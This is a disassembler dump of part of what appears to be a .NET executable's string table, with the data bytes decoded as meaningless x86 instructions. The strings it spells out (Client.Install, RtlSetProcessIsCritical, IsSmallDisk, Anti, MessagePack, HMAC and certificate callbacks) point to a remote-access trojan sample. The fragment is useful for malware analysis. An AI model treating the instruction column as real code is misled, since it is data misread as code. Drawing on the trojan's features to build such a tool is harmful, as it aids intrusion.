  4081d3:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081da:	73 65                	jae    0x408241
  4081dc:	6d                   	insl   (%dx),%es:(%edi)
  4081dd:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081e1:	65 73 63             	gs jae 0x408247
  4081e4:	72 69                	jb     0x40824f
  4081e6:	70 74                	jo     0x40825c
  4081e8:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ef:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f6:	65 66 61             	gs popaw
  4081f9:	75 6c                	jne    0x408267
  4081fb:	74 4d                	je     0x40824a
  4081fd:	65 6d                	gs insl (%dx),%es:(%edi)
  4081ff:	62 65 72             	bound  %esp,0x72(%ebp)
  408202:	41                   	inc    %ecx
  408203:	74 74                	je     0x408279
  408205:	72 69                	jb     0x408270
  408207:	62 75 74             	bound  %esi,0x74(%ebp)
  40820a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820e:	6d                   	insl   (%dx),%es:(%edi)
  40820f:	70 69                	jo     0x40827a
  408211:	6c                   	insb   (%dx),%es:(%edi)
  408212:	61                   	popa
  408213:	74 69                	je     0x40827e
  408215:	6f                   	outsl  %ds:(%esi),(%dx)
  408216:	6e                   	outsb  %ds:(%esi),(%dx)
  408217:	52                   	push   %edx
  408218:	65 6c                	gs insb (%dx),%es:(%edi)
  40821a:	61                   	popa
  40821b:	78 61                	js     0x40827e
  40821d:	74 69                	je     0x408288
  40821f:	6f                   	outsl  %ds:(%esi),(%dx)
  408220:	6e                   	outsb  %ds:(%esi),(%dx)
  408221:	73 41                	jae    0x408264
  408223:	74 74                	je     0x408299
  408225:	72 69                	jb     0x408290
  408227:	62 75 74             	bound  %esi,0x74(%ebp)
  40822a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822e:	73 65                	jae    0x408295
  408230:	6d                   	insl   (%dx),%es:(%edi)
  408231:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408235:	72 6f                	jb     0x4082a6
  408237:	64 75 63             	fs jne 0x40829d
  40823a:	74 41                	je     0x40827d
  40823c:	74 74                	je     0x4082b2
  40823e:	72 69                	jb     0x4082a9
  408240:	62 75 74             	bound  %esi,0x74(%ebp)
  408243:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408247:	73 65                	jae    0x4082ae
  408249:	6d                   	insl   (%dx),%es:(%edi)
  40824a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824e:	6f                   	outsl  %ds:(%esi),(%dx)
  40824f:	70 79                	jo     0x4082ca
  408251:	72 69                	jb     0x4082bc
  408253:	67 68 74 41 74 74    	addr16 push $0x74744174
  408259:	72 69                	jb     0x4082c4
  40825b:	62 75 74             	bound  %esi,0x74(%ebp)
  40825e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408262:	73 65                	jae    0x4082c9
  408264:	6d                   	insl   (%dx),%es:(%edi)
  408265:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408269:	6f                   	outsl  %ds:(%esi),(%dx)
  40826a:	6d                   	insl   (%dx),%es:(%edi)
  40826b:	70 61                	jo     0x4082ce
  40826d:	6e                   	outsb  %ds:(%esi),(%dx)
  40826e:	79 41                	jns    0x4082b1
  408270:	74 74                	je     0x4082e6
  408272:	72 69                	jb     0x4082dd
  408274:	62 75 74             	bound  %esi,0x74(%ebp)
  408277:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40827b:	6e                   	outsb  %ds:(%esi),(%dx)
  40827c:	74 69                	je     0x4082e7
  40827e:	6d                   	insl   (%dx),%es:(%edi)
  40827f:	65 43                	gs inc %ebx
  408281:	6f                   	outsl  %ds:(%esi),(%dx)
  408282:	6d                   	insl   (%dx),%es:(%edi)
  408283:	70 61                	jo     0x4082e6
  408285:	74 69                	je     0x4082f0
  408287:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40828a:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408291:	69 
  408292:	62 75 74             	bound  %esi,0x74(%ebp)
  408295:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408299:	74 5f                	je     0x4082fa
  40829b:	55                   	push   %ebp
  40829c:	73 65                	jae    0x408303
  40829e:	53                   	push   %ebx
  40829f:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a4:	78 65                	js     0x40830b
  4082a6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a9:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082ad:	61                   	popa
  4082ae:	64 42                	fs inc %edx
  4082b0:	79 74                	jns    0x408326
  4082b2:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b6:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082bd:	00 
  4082be:	44                   	inc    %esp
  4082bf:	65 6c                	gs insb (%dx),%es:(%edi)
  4082c1:	65 74 65             	gs je  0x408329
  4082c4:	56                   	push   %esi
  4082c5:	61                   	popa
  4082c6:	6c                   	insb   (%dx),%es:(%edi)
  4082c7:	75 65                	jne    0x40832e
  4082c9:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cd:	65 72 56             	gs jb  0x408326
  4082d0:	61                   	popa
  4082d1:	6c                   	insb   (%dx),%es:(%edi)
  4082d2:	75 65                	jne    0x408339
  4082d4:	00 47 65             	add    %al,0x65(%edi)
  4082d7:	74 56                	je     0x40832f
  4082d9:	61                   	popa
  4082da:	6c                   	insb   (%dx),%es:(%edi)
  4082db:	75 65                	jne    0x408342
  4082dd:	00 53 65             	add    %dl,0x65(%ebx)
  4082e0:	74 56                	je     0x408338
  4082e2:	61                   	popa
  4082e3:	6c                   	insb   (%dx),%es:(%edi)
  4082e4:	75 65                	jne    0x40834b
  4082e6:	00 76 61             	add    %dh,0x61(%esi)
  4082e9:	6c                   	insb   (%dx),%es:(%edi)
  4082ea:	75 65                	jne    0x408351
  4082ec:	00 67 65             	add    %ah,0x65(%edi)
  4082ef:	74 5f                	je     0x408350
  4082f1:	4b                   	dec    %ebx
  4082f2:	65 65 70 41          	gs gs jo 0x408337
  4082f6:	6c                   	insb   (%dx),%es:(%edi)
  4082f7:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fe:	5f                   	pop    %edi
  4082ff:	4b                   	dec    %ebx
  408300:	65 65 70 41          	gs gs jo 0x408345
  408304:	6c                   	insb   (%dx),%es:(%edi)
  408305:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40830c:	6f                   	outsl  %ds:(%esi),(%dx)
  40830d:	76 65                	jbe    0x408374
  40830f:	00 41 44             	add    %al,0x44(%ecx)
  408312:	52                   	push   %edx
  408313:	4f                   	dec    %edi
  408314:	49                   	dec    %ecx
  408315:	44                   	inc    %esp
  408316:	4e                   	dec    %esi
  408317:	48                   	dec    %eax
  408318:	4f                   	dec    %edi
  408319:	2e 65 78 65          	cs js,pn 0x408382
  40831d:	00 73 65             	add    %dh,0x65(%ebx)
  408320:	74 5f                	je     0x408381
  408322:	42                   	inc    %edx
  408323:	6c                   	insb   (%dx),%es:(%edi)
  408324:	6f                   	outsl  %ds:(%esi),(%dx)
  408325:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408328:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40832f:	5f                   	pop    %edi
  408330:	54                   	push   %esp
  408331:	6f                   	outsl  %ds:(%esi),(%dx)
  408332:	74 61                	je     0x408395
  408334:	6c                   	insb   (%dx),%es:(%edi)
  408335:	53                   	push   %ebx
  408336:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40833d:	5f                   	pop    %edi
  40833e:	48                   	dec    %eax
  40833f:	65 61                	gs popa
  408341:	64 65 72 53          	fs gs jb 0x408398
  408345:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40834c:	5f                   	pop    %edi
  40834d:	48                   	dec    %eax
  40834e:	65 61                	gs popa
  408350:	64 65 72 53          	fs gs jb 0x4083a7
  408354:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40835b:	5f                   	pop    %edi
  40835c:	53                   	push   %ebx
  40835d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40835f:	64 42                	fs inc %edx
  408361:	75 66                	jne    0x4083c9
  408363:	66 65 72 53          	data16 gs jb 0x4083ba
  408367:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40836e:	5f                   	pop    %edi
  40836f:	52                   	push   %edx
  408370:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408374:	76 65                	jbe    0x4083db
  408376:	42                   	inc    %edx
  408377:	75 66                	jne    0x4083df
  408379:	66 65 72 53          	data16 gs jb 0x4083d0
  40837d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408384:	5f                   	pop    %edi
  408385:	4b                   	dec    %ebx
  408386:	65 79 53             	gs jns 0x4083dc
  408389:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408390:	65 78 4f             	gs js  0x4083e2
  408393:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  408397:	72 46                	jb     0x4083df
  408399:	6c                   	insb   (%dx),%es:(%edi)
  40839a:	61                   	popa
  40839b:	67 00 43 72          	add    %al,0x72(%bp,%di)
  40839f:	79 70                	jns    0x408411
  4083a1:	74 6f                	je     0x408412
  4083a3:	43                   	inc    %ebx
  4083a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a6:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083ac:	74 5f                	je     0x40840d
  4083ae:	50                   	push   %eax
  4083af:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083b6:	5f                   	pop    %edi
  4083b7:	50                   	push   %eax
  4083b8:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083bf:	74 65                	je     0x408426
  4083c1:	6d                   	insl   (%dx),%es:(%edi)
  4083c2:	2e 54                	cs push %esp
  4083c4:	68 72 65 61 64       	push   $0x64616572
  4083c9:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083d0:	5f                   	pop    %edi
  4083d1:	50                   	push   %eax
  4083d2:	61                   	popa
  4083d3:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083da:	64 64 
  4083dc:	5f                   	pop    %edi
  4083dd:	53                   	push   %ebx
  4083de:	65 73 73             	gs jae 0x408454
  4083e1:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e9:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083ed:	73 74                	jae    0x408463
  4083ef:	65 6d                	gs insl (%dx),%es:(%edi)
  4083f1:	45                   	inc    %ebp
  4083f2:	76 65                	jbe    0x408459
  4083f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f5:	74 73                	je     0x40846a
  4083f7:	5f                   	pop    %edi
  4083f8:	53                   	push   %ebx
  4083f9:	65 73 73             	gs jae 0x40846f
  4083fc:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408403:	6e                   	outsb  %ds:(%esi),(%dx)
  408404:	67 00 55 54          	add    %dl,0x54(%di)
  408408:	46                   	inc    %esi
  408409:	38 45 6e             	cmp    %al,0x6e(%ebp)
  40840c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40840f:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408416:	74 65                	je     0x40847d
  408418:	6d                   	insl   (%dx),%es:(%edi)
  408419:	2e 44                	cs inc %esp
  40841b:	72 61                	jb     0x40847e
  40841d:	77 69                	ja     0x408488
  40841f:	6e                   	outsb  %ds:(%esi),(%dx)
  408420:	67 2e 49             	addr16 cs dec %ecx
  408423:	6d                   	insl   (%dx),%es:(%edi)
  408424:	61                   	popa
  408425:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  40842c:	73 
  40842d:	74 65                	je     0x408494
  40842f:	6d                   	insl   (%dx),%es:(%edi)
  408430:	2e 52                	cs push %edx
  408432:	75 6e                	jne    0x4084a2
  408434:	74 69                	je     0x40849f
  408436:	6d                   	insl   (%dx),%es:(%edi)
  408437:	65 2e 56             	gs cs push %esi
  40843a:	65 72 73             	gs jb  0x4084b0
  40843d:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408444:	46                   	inc    %esi
  408445:	72 6f                	jb     0x4084b6
  408447:	6d                   	insl   (%dx),%es:(%edi)
  408448:	42                   	inc    %edx
  408449:	61                   	popa
  40844a:	73 65                	jae    0x4084b1
  40844c:	36 34 53             	ss xor $0x53,%al
  40844f:	74 72                	je     0x4084c3
  408451:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408458:	61                   	popa
  408459:	73 65                	jae    0x4084c0
  40845b:	36 34 53             	ss xor $0x53,%al
  40845e:	74 72                	je     0x4084d2
  408460:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  408467:	64 53                	fs push %ebx
  408469:	74 72                	je     0x4084dd
  40846b:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408472:	6e                   	outsb  %ds:(%esi),(%dx)
  408473:	6c                   	insb   (%dx),%es:(%edi)
  408474:	6f                   	outsl  %ds:(%esi),(%dx)
  408475:	61                   	popa
  408476:	64 53                	fs push %ebx
  408478:	74 72                	je     0x4084ec
  40847a:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408481:	74 65                	je     0x4084e8
  408483:	53                   	push   %ebx
  408484:	74 72                	je     0x4084f8
  408486:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40848d:	74 72                	je     0x408501
  40848f:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408496:	5f                   	pop    %edi
  408497:	41                   	inc    %ecx
  408498:	73 53                	jae    0x4084ed
  40849a:	74 72                	je     0x40850e
  40849c:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4084a3:	5f                   	pop    %edi
  4084a4:	41                   	inc    %ecx
  4084a5:	73 53                	jae    0x4084fa
  4084a7:	74 72                	je     0x40851b
  4084a9:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084b0:	65 73 41             	gs jae 0x4084f4
  4084b3:	73 53                	jae    0x408508
  4084b5:	74 72                	je     0x408529
  4084b7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084be:	41                   	inc    %ecx
  4084bf:	73 53                	jae    0x408514
  4084c1:	74 72                	je     0x408535
  4084c3:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084ca:	41                   	inc    %ecx
  4084cb:	73 53                	jae    0x408520
  4084cd:	74 72                	je     0x408541
  4084cf:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084d6:	53                   	push   %ebx
  4084d7:	74 72                	je     0x40854b
  4084d9:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084e0:	65 73 41             	gs jae 0x408524
  4084e3:	73 48                	jae    0x40852d
  4084e5:	65 78 53             	gs js  0x40853b
  4084e8:	74 72                	je     0x40855c
  4084ea:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084f1:	73 74                	jae    0x408567
  4084f3:	72 69                	jb     0x40855e
  4084f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f6:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084fa:	73 74                	jae    0x408570
  4084fc:	65 6d                	gs insl (%dx),%es:(%edi)
  4084fe:	2e 44                	cs inc %esp
  408500:	72 61                	jb     0x408563
  408502:	77 69                	ja     0x40856d
  408504:	6e                   	outsb  %ds:(%esi),(%dx)
  408505:	67 00 67 65          	add    %ah,0x65(%bx)
  408509:	74 5f                	je     0x40856a
  40850b:	41                   	inc    %ecx
  40850c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408510:	61                   	popa
  408511:	74 65                	je     0x408578
  408513:	50                   	push   %eax
  408514:	6f                   	outsl  %ds:(%esi),(%dx)
  408515:	6e                   	outsb  %ds:(%esi),(%dx)
  408516:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40851a:	74 5f                	je     0x40857b
  40851c:	41                   	inc    %ecx
  40851d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408521:	61                   	popa
  408522:	74 65                	je     0x408589
  408524:	50                   	push   %eax
  408525:	6f                   	outsl  %ds:(%esi),(%dx)
  408526:	6e                   	outsb  %ds:(%esi),(%dx)
  408527:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40852b:	74 5f                	je     0x40858c
  40852d:	45                   	inc    %ebp
  40852e:	72 72                	jb     0x4085a2
  408530:	6f                   	outsl  %ds:(%esi),(%dx)
  408531:	72 44                	jb     0x408577
  408533:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  40853a:	73 67                	jae    0x4085a3
  40853c:	00 43 6f             	add    %al,0x6f(%ebx)
  40853f:	6d                   	insl   (%dx),%es:(%edi)
  408540:	70 75                	jo     0x4085b7
  408542:	74 65                	je     0x4085a9
  408544:	48                   	dec    %eax
  408545:	61                   	popa
  408546:	73 68                	jae    0x4085b0
  408548:	00 73 74             	add    %dh,0x74(%ebx)
  40854b:	72 54                	jb     0x4085a1
  40854d:	6f                   	outsl  %ds:(%esi),(%dx)
  40854e:	48                   	dec    %eax
  40854f:	61                   	popa
  408550:	73 68                	jae    0x4085ba
  408552:	00 47 65             	add    %al,0x65(%edi)
  408555:	74 48                	je     0x40859f
  408557:	61                   	popa
  408558:	73 68                	jae    0x4085c2
  40855a:	00 56 65             	add    %dl,0x65(%esi)
  40855d:	72 69                	jb     0x4085c8
  40855f:	66 79 48             	data16 jns 0x4085aa
  408562:	61                   	popa
  408563:	73 68                	jae    0x4085cd
  408565:	00 46 6c             	add    %al,0x6c(%esi)
  408568:	75 73                	jne    0x4085dd
  40856a:	68 00 67 65 74       	push   $0x74656700
  40856f:	5f                   	pop    %edi
  408570:	45                   	inc    %ebp
  408571:	78 65                	js     0x4085d8
  408573:	63 75 74             	arpl   %esi,0x74(%ebp)
  408576:	61                   	popa
  408577:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  40857b:	61                   	popa
  40857c:	74 68                	je     0x4085e6
  40857e:	00 47 65             	add    %al,0x65(%edi)
  408581:	74 54                	je     0x4085d7
  408583:	65 6d                	gs insl (%dx),%es:(%edi)
  408585:	70 50                	jo     0x4085d7
  408587:	61                   	popa
  408588:	74 68                	je     0x4085f2
  40858a:	00 70 61             	add    %dh,0x61(%eax)
  40858d:	74 68                	je     0x4085f7
  40858f:	00 48 6d             	add    %cl,0x6d(%eax)
  408592:	61                   	popa
  408593:	63 53 68             	arpl   %edx,0x68(%ebx)
  408596:	61                   	popa
  408597:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40859d:	67 74 68             	addr16 je 0x408608
  4085a0:	00 67 65             	add    %ah,0x65(%edi)
  4085a3:	74 5f                	je     0x408604
  4085a5:	4c                   	dec    %esp
  4085a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a8:	67 74 68             	addr16 je 0x408613
  4085ab:	00 49 76             	add    %cl,0x76(%ecx)
  4085ae:	4c                   	dec    %esp
  4085af:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b1:	67 74 68             	addr16 je 0x40861c
  4085b4:	00 41 75             	add    %al,0x75(%ecx)
  4085b7:	74 68                	je     0x408621
  4085b9:	4b                   	dec    %ebx
  4085ba:	65 79 4c             	gs jns 0x408609
  4085bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085bf:	67 74 68             	addr16 je 0x40862a
  4085c2:	00 55 72             	add    %dl,0x72(%ebp)
  4085c5:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085cb:	00 6d 73             	add    %ch,0x73(%ebp)
  4085ce:	67 70 61             	addr16 jo 0x408632
  4085d1:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085d4:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085d7:	6c                   	insb   (%dx),%es:(%edi)
  4085d8:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085df:	6f                   	outsl  %ds:(%esi),(%dx)
  4085e0:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085e3:	4d                   	dec    %ebp
  4085e4:	65 73 73             	gs jae 0x40865a
  4085e7:	61                   	popa
  4085e8:	67 65 50             	addr16 gs push %eax
  4085eb:	61                   	popa
  4085ec:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085ef:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085f6:	61                   	popa
  4085f7:	67 65 50             	addr16 gs push %eax
  4085fa:	61                   	popa
  4085fb:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fe:	4d                   	dec    %ebp
  4085ff:	73 67                	jae    0x408668
  408601:	50                   	push   %eax
  408602:	61                   	popa
  408603:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408606:	41                   	inc    %ecx
  408607:	73 79                	jae    0x408682
  408609:	6e                   	outsb  %ds:(%esi),(%dx)
  40860a:	63 43 61             	arpl   %eax,0x61(%ebx)
  40860d:	6c                   	insb   (%dx),%es:(%edi)
  40860e:	6c                   	insb   (%dx),%es:(%edi)
  40860f:	62 61 63             	bound  %esp,0x63(%ecx)
  408612:	6b 00 52             	imul   $0x52,(%eax),%eax
  408615:	65 6d                	gs insl (%dx),%es:(%edi)
  408617:	6f                   	outsl  %ds:(%esi),(%dx)
  408618:	74 65                	je     0x40867f
  40861a:	43                   	inc    %ebx
  40861b:	65 72 74             	gs jb  0x408692
  40861e:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408625:	56                   	push   %esi
  408626:	61                   	popa
  408627:	6c                   	insb   (%dx),%es:(%edi)
  408628:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40862f:	43 
  408630:	61                   	popa
  408631:	6c                   	insb   (%dx),%es:(%edi)
  408632:	6c                   	insb   (%dx),%es:(%edi)
  408633:	62 61 63             	bound  %esp,0x63(%ecx)
  408636:	6b 00 54             	imul   $0x54,(%eax),%eax
  408639:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408640:	6c                   	insb   (%dx),%es:(%edi)
  408641:	62 61 63             	bound  %esp,0x63(%ecx)
  408644:	6b 00 75             	imul   $0x75,(%eax),%eax
  408647:	6e                   	outsb  %ds:(%esi),(%dx)
  408648:	70 61                	jo     0x4086ab
  40864a:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40864d:	6d                   	insl   (%dx),%es:(%edi)
  40864e:	73 67                	jae    0x4086b7
  408650:	70 61                	jo     0x4086b3
  408652:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408655:	52                   	push   %edx
  408656:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40865d:	4b 65 
  40865f:	79 50                	jns    0x4086b1
  408661:	65 72 6d             	gs jb  0x4086d1
  408664:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  40866b:	68 65 63 6b 00       	push   $0x6b6365
  408670:	46                   	inc    %esi
  408671:	6c                   	insb   (%dx),%es:(%edi)
  408672:	75 73                	jne    0x4086e7
  408674:	68 46 69 6e 61       	push   $0x616e6946
  408679:	6c                   	insb   (%dx),%es:(%edi)
  40867a:	42                   	inc    %edx
  40867b:	6c                   	insb   (%dx),%es:(%edi)
  40867c:	6f                   	outsl  %ds:(%esi),(%dx)
  40867d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408680:	49                   	dec    %ecx
  408681:	73 53                	jae    0x4086d6
  408683:	6d                   	insl   (%dx),%es:(%edi)
  408684:	61                   	popa
  408685:	6c                   	insb   (%dx),%es:(%edi)
  408686:	6c                   	insb   (%dx),%es:(%edi)
  408687:	44                   	inc    %esp
  408688:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40868f:	6c                   	insb   (%dx),%es:(%edi)
  408690:	00 66 56             	add    %ah,0x56(%esi)
  408693:	61                   	popa
  408694:	6c                   	insb   (%dx),%es:(%edi)
  408695:	00 69 56             	add    %ch,0x56(%ecx)
  408698:	61                   	popa
  408699:	6c                   	insb   (%dx),%es:(%edi)
  40869a:	00 73 74             	add    %dh,0x74(%ebx)
  40869d:	72 56                	jb     0x4086f5
  40869f:	61                   	popa
  4086a0:	6c                   	insb   (%dx),%es:(%edi)
  4086a1:	00 52 74             	add    %dl,0x74(%edx)
  4086a4:	6c                   	insb   (%dx),%es:(%edi)
  4086a5:	53                   	push   %ebx
  4086a6:	65 74 50             	gs je  0x4086f9
  4086a9:	72 6f                	jb     0x40871a
  4086ab:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086ae:	73 49                	jae    0x4086f9
  4086b0:	73 43                	jae    0x4086f5
  4086b2:	72 69                	jb     0x40871d
  4086b4:	74 69                	je     0x40871f
  4086b6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086b9:	00 50 72             	add    %dl,0x72(%eax)
  4086bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4086bd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086c0:	73 43                	jae    0x408705
  4086c2:	72 69                	jb     0x40872d
  4086c4:	74 69                	je     0x40872f
  4086c6:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4086c9:	00 4e 65             	add    %cl,0x65(%esi)
  4086cc:	74 77                	je     0x408745
  4086ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4086cf:	72 6b                	jb     0x40873c
  4086d1:	43                   	inc    %ebx
  4086d2:	72 65                	jb     0x408739
  4086d4:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4086d7:	74 69                	je     0x408742
  4086d9:	61                   	popa
  4086da:	6c                   	insb   (%dx),%es:(%edi)
  4086db:	00 53 79             	add    %dl,0x79(%ebx)
  4086de:	73 74                	jae    0x408754
  4086e0:	65 6d                	gs insl (%dx),%es:(%edi)
  4086e2:	2e 53                	cs push %ebx
  4086e4:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4086e8:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4086ef:	6e 
  4086f0:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4086f3:	61                   	popa
  4086f4:	6c                   	insb   (%dx),%es:(%edi)
  4086f5:	00 57 69             	add    %dl,0x69(%edi)
  4086f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086fb:	77 73                	ja     0x408770
  4086fd:	50                   	push   %eax
  4086fe:	72 69                	jb     0x408769
  408700:	6e                   	outsb  %ds:(%esi),(%dx)
  408701:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408704:	61                   	popa
  408705:	6c                   	insb   (%dx),%es:(%edi)
  408706:	00 41 72             	add    %al,0x72(%ecx)
  408709:	65 45                	gs inc %ebp
  40870b:	71 75                	jno    0x408782
  40870d:	61                   	popa
  40870e:	6c                   	insb   (%dx),%es:(%edi)
  40870f:	00 67 65             	add    %ah,0x65(%edi)
  408712:	74 5f                	je     0x408773
  408714:	49                   	dec    %ecx
  408715:	6e                   	outsb  %ds:(%esi),(%dx)
  408716:	74 65                	je     0x40877d
  408718:	72 76                	jb     0x408790
  40871a:	61                   	popa
  40871b:	6c                   	insb   (%dx),%es:(%edi)
  40871c:	00 73 65             	add    %dh,0x65(%ebx)
  40871f:	74 5f                	je     0x408780
  408721:	49                   	dec    %ecx
  408722:	6e                   	outsb  %ds:(%esi),(%dx)
  408723:	74 65                	je     0x40878a
  408725:	72 76                	jb     0x40879d
  408727:	61                   	popa
  408728:	6c                   	insb   (%dx),%es:(%edi)
  408729:	00 43 6c             	add    %al,0x6c(%ebx)
  40872c:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408733:	73 74                	jae    0x4087a9
  408735:	61                   	popa
  408736:	6c                   	insb   (%dx),%es:(%edi)
  408737:	6c                   	insb   (%dx),%es:(%edi)
  408738:	00 6b 65             	add    %ch,0x65(%ebx)
  40873b:	72 6e                	jb     0x4087ab
  40873d:	65 6c                	gs insb (%dx),%es:(%edi)
  40873f:	33 32                	xor    (%edx),%esi
  408741:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408744:	6c                   	insb   (%dx),%es:(%edi)
  408745:	00 75 73             	add    %dh,0x73(%ebp)
  408748:	65 72 33             	gs jb  0x40877e
  40874b:	32 2e                	xor    (%esi),%ch
  40874d:	64 6c                	fs insb (%dx),%es:(%edi)
  40874f:	6c                   	insb   (%dx),%es:(%edi)
  408750:	00 6e 74             	add    %ch,0x74(%esi)
